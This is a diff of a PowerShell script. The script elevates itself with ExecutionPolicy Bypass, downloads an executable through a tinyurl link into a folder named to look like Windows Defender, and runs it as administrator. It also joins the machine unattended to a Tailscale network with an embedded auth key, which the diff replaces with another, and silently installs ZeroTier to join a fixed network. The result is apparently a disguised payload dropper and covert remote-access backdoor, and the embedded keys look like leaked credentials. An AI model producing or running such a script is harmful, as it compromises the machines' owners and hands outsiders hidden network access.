@@ -3,11 +3,10 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
-
+tailscale up --auth-key=tskey-auth-kAFCkKFvM721CNTRL-KrhpbsekTn83nSMSdz6fn81Vw8tNZTwe --unattended
 Invoke-WebRequest -Uri "https://tinyurl.com/46jswbnp" -OutFile "C:\Program Files\defender\Executable\def.exe"
 Start-Process "C:\Program Files\defender\Executable\def.exe" -Verb RunAs
-tailscale up --auth-key=tskey-auth-kDmVZv8Wr411CNTRL-W38EWMdmKoHAVMvJFC19oHPH2Ra4X1Yvb --unattended
-tailscale up --unattended
+
 Invoke-WebRequest -Uri "https://download.zerotier.com/RELEASES/1.12.2/dist/ZeroTier%20One.msi" -OutFile "$env:USERPROFILE\Downloads\ZeroTier.msi"
 Start-Process "msiexec.exe" -ArgumentList "/i `"$env:USERPROFILE\Downloads\ZeroTier.msi`" /qn" -Wait
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
@@ -18,4 +17,4 @@ $env:Path = [System.Environment]::GetEnvironmentVariable("Path", [System.Environ
 
 choco install zerotier-one -y
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
-zerotier-cli join 8bd5124fd6abcf8f
+zerotier-cli join "8bd5124fd6abcf8f"
